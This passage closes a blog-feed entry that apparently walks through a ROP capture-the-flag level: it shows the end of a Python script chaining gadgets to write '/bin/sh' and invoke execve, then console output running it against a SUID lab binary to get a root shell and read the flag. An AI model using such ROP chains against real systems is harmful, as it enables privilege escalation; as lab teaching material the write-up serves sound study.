</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">popedx</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="c"># Put the address of BSS + 7.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">movedx</span>                       <span class="c"># Store a NUL after the string.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">xoreax</span> <span class="o">+</span> <span class="n">boom</span>                <span class="c"># The xor gadget also pops.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">inceax</span> <span class="o">*</span> <span class="n">execvenb</span>            <span class="c"># eax = 11.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">popebx</span> <span class="o">+</span> <span class="n">bssaddr</span>             <span class="c"># ebx = &quot;/bin/sh\0&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>In conclusion, the execution of the SUID binary with the payload as an argument
to capture the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level2@rop:~$</span> ./level2 <span class="sb">`</span>python boom.py<span class="sb">`</span>
</span><span class='line'><span class="go">[+] ROP tutorial level2</span>
</span><span class='line'><span class="go">[+] Bet you can&#39;t ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#@#</span>
</span><span class='line'><span class="go">                                                                                              ##A#</span>
</span><span class='line'><span class="go">                                                                                                b#B#</span>
</span><span class='line'><span class="go">                                                                                                   #C#</span>
</span><span class='line'><span class="go">                                                                                                     e#D#</span>
</span><span class='line'><span class="go">                                                                                                        ##E#</span>
</span><span class='line'><span class="go">                                                                                                           #F#</span>
</span><span class='line'><span class="go">                                                                                                           DCBAvG#</span>
</span><span class='line'><span class="go">                                                                                                                DCBA#@#</span>
</span><span class='line'><span class="go">                                                                                                                      #!</span>
</span><span class='line'><span class="gp">#</span> cat flag
</span><span class='line'><span class="go">flag{to_rop_or_not_to_rop}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
</feed>
